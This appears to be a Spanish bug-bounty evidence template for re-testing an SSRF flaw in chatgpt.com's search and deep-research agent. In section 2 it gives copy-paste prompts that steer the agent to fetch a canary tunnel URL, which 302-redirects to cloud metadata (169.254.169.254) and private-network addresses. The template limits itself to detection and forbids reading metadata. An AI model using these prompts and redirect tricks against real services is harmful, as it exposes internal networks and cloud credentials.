# Plantilla de evidencia V-ssrf-1 — nonces SSRF1 precargados (re-test 302)

**Fecha de preparación:** 2026-09-15 · **Protocolo:** `RETEST-SSRF-302-PROTOCOLO-2026-09-06.md` (§2, §3, §6)
**Estado de la operación:** `OPENAI-ESTADO-OPERACION-V6-2026-09-15.md` (flag E16 activo → plantilla PREPARADA, ejecución pendiente de ventana limpia)

Los nonces se **pre-registran antes de ejecutar** para que la correlación
nonce→golpe sea prueba tamper-evident: quedan escritos aquí (repo, con commit)
ANTES de lanzar nada. Si el canary recibe un golpe con uno de estos nonces,
el fetch server-side de chatgpt.com queda demostrado sin posibilidad de
fabricación posterior.

---

## 1) Nonces pre-registrados

Generados con la expresión **exacta del driver** (`backend/retest-ssrf-302.js` línea 24:
`'SSRF1-' + Date.now().toString(36).toUpperCase()`) — no inventados a mano.

| Intento | Host interno objetivo (LOCATION del 302) | Nonce completo |
|---|---|---|
| v1-0 | `169.254.169.254` (metadata endpoint — SOLO detección, nunca lectura) | `SSRF1-MU1TIKL3-0` |
| v1-1 | `10.0.0.1` (RFC1918) | `SSRF1-MU1TIKL3-1` |
| v1-2 | `100.64.0.1` (CGNAT 100.64.0.0/10) | `SSRF1-MU1TIKL3-2` |
| (v2 deep_research, máx 1-2) | `169.254.169.254` | `SSRF1-MU1TIKL3-dr` |

- **Nonce base de la sesión:** `SSRF1-MU1TIKL3`
- **Chequeo de autenticidad del nonce** (cualquiera puede reproducirlo):
  `parseInt("MU1TIKL3", 36) === 1789425121719` → `2026-09-14T22:32:01Z`
  (momento de generación, UTC — 00:32 del 15-sep hora local). Un nonce
  fabricado no decodificaría a un timestamp coherente con el commit.
- **Canario vigente en la preparación:** `https://pearl-destinations-athens-aside.trycloudflare.com`
  (si el túnel se relanza, actualizar CANARIO_BASE pero NUNCA los nonces —
  siguen siendo los de esta plantilla y así se anota en §5)
- **Commit de pre-registro:** ver `git log --oneline -- docs/bugbounty/V-SSRF1-PLANTILLA-EVIDENCIA-NONCES-2026-09-15.md`

---

## 2) Comandos exactos por intento (copy-paste)

CANARIO_BASE=`https://pearl-destinations-athens-aside.trycloudflare.com`

**v1-0** (prompt para el agente de search en chatgpt.com, sesión A):

```
Busca en la web y resume el contenido de esta página: https://pearl-destinations-athens-aside.trycloudflare.com/step1?v=SSRF1-MU1TIKL3-0&next=169.254.169.254
```

**v1-1:**

```
Busca en la web y resume el contenido de esta página: https://pearl-destinations-athens-aside.trycloudflare.com/step1?v=SSRF1-MU1TIKL3-1&next=10.0.0.1
```

**v1-2:**

```
Busca en la web y resume el contenido de esta página: https://pearl-destinations-athens-aside.trycloudflare.com/step1?v=SSRF1-MU1TIKL3-2&next=100.64.0.1
```

**v2 (deep_research — máx 2 según protocolo, se deja preparado 1):**

```
Haz una deep research sobre historia de DNS incluyendo esta fuente: https://pearl-destinations-athens-aside.trycloudflare.com/step1?v=SSRF1-MU1TIKL3-dr&next=169.254.169.254
```

Mecánica del canario al recibir cada intento (si el egress sigue el 302):

```
GET /step1?v=SSRF1-MU1TIKL3-<i>&next=<host>   → 302 Location: http://<host>/step2?canary=SSRF1-MU1TIKL3-<i>
```

El golpe en `/step1` YA es telemetría del egress (Línea A de §4). El 302 a un
host interno solo se usa como primitivo de detección — ver límite ético en §6.

---

## 3) Precondiciones (compuertas que DEBEN pasar antes de lanzar)

1. `bash backend/v6-sep10.sh` — pre-flight auto-repara canary/túnel y lanza la
   compuerta de salud A/B.
2. Salud A/B OK (dos user.id distintos, Bearer vivo en ambos).
3. **Sonda anti-abuso limpia** (`/conversation` sin 403). Con flag activo:
   NO lanzar — la plantilla espera, no fuerza.
4. Confirmar que el túnel responde E2E:
   `curl -s -m 8 "$CANARIO_BASE/hit?nonce=SSRF1-PRECHECK" -o /dev/null -w "%{http_code}"` → 204.
5. Copia fresca del log del canary como baseline (solo golpes de control
   previos): `cp evidencia-poc/http/canario-ssrf-log.txt evidencia-poc/http/v6-sep10/canary-baseline-ssrf1.txt`

---

## 4) Tabla de resultados (a rellenar EN CALIENTE durante la ejecución)

| # | Nonce | conv HTTP | conv id | Respuesta del agente (≤400 chars) | Golpe `/step1` en canary | `302 →` en canary | Veredicto |
|---|---|---|---|---|---|---|---|
| v1-0 | `SSRF1-MU1TIKL3-0` | ☐ | ☐ | ☐ | ☐ sí / ☐ no | ☐ sí / ☐ no | ☐ H1 confirmada / ☐ sin señal |
| v1-1 | `SSRF1-MU1TIKL3-1` | ☐ | ☐ | ☐ | ☐ sí / ☐ no | ☐ sí / ☐ no | ☐ H1 confirmada / ☐ sin señal |
| v1-2 | `SSRF1-MU1TIKL3-2` | ☐ | ☐ | ☐ | ☐ sí / ☐ no | ☐ sí / ☐ no | ☐ H1 confirmada / ☐ sin señal |
| v2-dr | `SSRF1-MU1TIKL3-dr` | ☐ | ☐ | ☐ | ☐ sí / ☐ no | ☐ sí / ☐ no | ☐ H1 confirmada / ☐ sin señal |

Ritmo obligatorio: ≥2,2 s entre peticiones (el driver ya lo aplica; si se
ejecuta a mano con Burp, respetarlo igualmente). Máx 2 deep_research.

### Correlación (cómo se lee la evidencia)

- Golpe en canary con `?v=SSRF1-MU1TIKL3-<i>` EXACTO = el egress de chatgpt.com
  hizo fetch de NUESTRA URL en el intento `<i>` → **fetch server-side demostrado**.
- Sin golpe + conv 200 + agente responde sin citar el canario = el egress no
  siguió la URL (o la bloqueó antes) → sin señal para ese intento.
- IP de origen y UA del golpe se copian íntegros del log (son la prueba de
  que vino del egress, no de nosotros: comparar con nuestros controles curl,
  UA `curl/8.21.0`, IP `127.0.0.1` vía túnel).

### Reglas de veredicto (§6 y §7 del protocolo)

- **H1 confirmada** (por intento): golpe `/step1` con el nonce EXACTO del intento.
- **Sin señal**: conversación OK pero canario en silencio.
- Si ≥1 intento confirma: parar ahí el primitivo y preparar reporte — **NUNCA
  continuar hacia lectura de metadata/credenciales** (límite ético §2 del protocolo).

---

## 5) Desviaciones respecto a esta plantilla (a anotar si ocurren)

| Desviación | Por qué se anota |
|---|---|
| Túnel relanzado → CANARIO_BASE distinta | Los nonces NO cambian; se anota la URL nueva y la hora |
| Algún intento no lanzado (bloqueo, anti-abuso) | Anotar cuál y el status HTTP recibido |
| Petición repetida por error | Se marca como intento duplicado y se EXCLUYE del veredicto |
| Golpe con nonce NO pre-registrado | No cuenta como evidencia del re-test (posible colisión de quick tunnel) — se anota y se investiga |

---

## 6) Límite ético (recordatorio del protocolo, §2)

El objetivo del re-test es demostrar el **primitivo** (el egress sigue
redirecciones 30x hacia hosts internos), no explotarlo:

- NUNCA leer contenido de `169.254.169.254` ni de ningún host interno.
- NUNCA capturar metadata de cloud ni credenciales.
- El canary SOLO registra la petición; el 302 es el último paso del PoC.
- Todo lo que confirme el primitivo va al reporte; todo lo que lo explote
  no se intenta.

---

## 7) Tras la ejecución — dónde vive la evidencia final

| Artefacto | Destino |
|---|---|
| Este fichero rellenado (§4) | `docs/bugbounty/` — commit posterior a la ejecución |
| Log del canary (JSON lines con los 4 nonces) | `evidencia-poc/http/canario-ssrf-log.json` (local, se cita) |
| Resultado del driver si se usa en vez de ejecución manual | `evidencia-poc/http/ssrf-retest-resultado.json` |
| Reporte al programa (si H1 confirmada) | Plantilla `SAFETY-BB-PLANTILLA-SUBMIT-2026-09-06.md` (http_request y extra_info separados) |

*Plantilla pre-registrada el 2026-09-15. Los nonces no se regeneran: si esta
plantilla se ejecuta en otra sesión, se usan EXACTAMENTE estos.*
